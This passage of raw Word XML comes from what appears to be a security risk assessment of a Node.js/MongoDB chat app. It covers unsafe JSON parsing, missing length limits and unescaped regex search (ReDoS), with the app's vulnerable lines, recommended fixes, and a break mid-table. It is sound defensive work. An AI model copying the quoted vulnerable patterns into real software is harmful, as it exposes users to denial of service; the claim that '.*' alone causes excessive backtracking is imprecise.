          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Replace global </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>io.emit()</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> with targeted room-based broadcasts for status changes</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Add database indexes on frequently queried fields (</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>chat</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>sender</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>readBy</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7. Risk Area 6: Input Validation &amp; Error Handling</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Severity: 🟢 LOW-MEDIUM</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7.1 Identification</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Several API endpoints accept user input with minimal validation, relying on framework defaults and database constraints rather than explicit input sanitization.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7.2 Evidence</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Vulnerability A — Unsafe JSON Parsing:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:fill="F4F4F4" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[javascript]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// chatControllers.js, line 230:</w:t>
        <w:br/>
        <w:t>var users = JSON.parse(req.body.users);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>JSON.parse()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> throws a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>SyntaxError</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> if the input is not valid JSON. While </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>express-async-handler</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> catches this error and passes it to the error middleware, the error message may expose internal implementation details:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:fill="F4F4F4" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>SyntaxError: Unexpected token 'x' in JSON at position 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Vulnerability B — No Content Length Limits:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>There is no validation on the length of message content, chat names, or user display names:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:fill="F4F4F4" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[javascript]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// messageControllers.js — sendMessage:</w:t>
        <w:br/>
        <w:t>const { content, chatId } = req.body;</w:t>
        <w:br/>
        <w:t>if (!content || !chatId) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return res.sendStatus(400);</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:t>// No check: content.length &lt;= MAX_MESSAGE_LENGTH</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>A malicious user could send a message containing millions of characters, consuming disproportionate database storage and causing rendering performance issues for recipients.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Vulnerability C — Regex-Based Search Without Escaping:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:fill="F4F4F4" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[javascript]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// userControllers.js:</w:t>
        <w:br/>
        <w:t>{ name: { $regex: req.query.search, $options: "i" } }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">The search query is passed directly into a MongoDB </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>$regex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> operator without escaping special regex characters. A user could submit a crafted regex pattern (e.g., </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>) that causes excessive backtracking, potentially leading to a ReDoS (Regular Expression Denial of Service) attack.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7.3 Current Mitigation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>express-async-handler</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> wraps all route handlers, preventing unhandled exceptions from crashing the server. - The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>errorHandler</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> middleware in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>errorMiddleware.js</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> standardizes error responses. - React's JSX rendering automatically escapes HTML entities, preventing stored XSS from rendering in the UI. - MongoDB document size limit (16MB) provides an implicit upper bound on individual message size.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7.4 Recommended Mitigation</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="autofit"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3120"/>
        <w:gridCol w:w="3120"/>
        <w:gridCol w:w="3120"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Mitigation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Priority</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Effort</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Wrap </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>JSON.parse</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> in try-catch with sanitized error messages</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Add content length validation (e.g., max 5,000 characters per message)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Escape regex special characters in search queries using </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>escapeRegex()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Implement request body size limits via </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
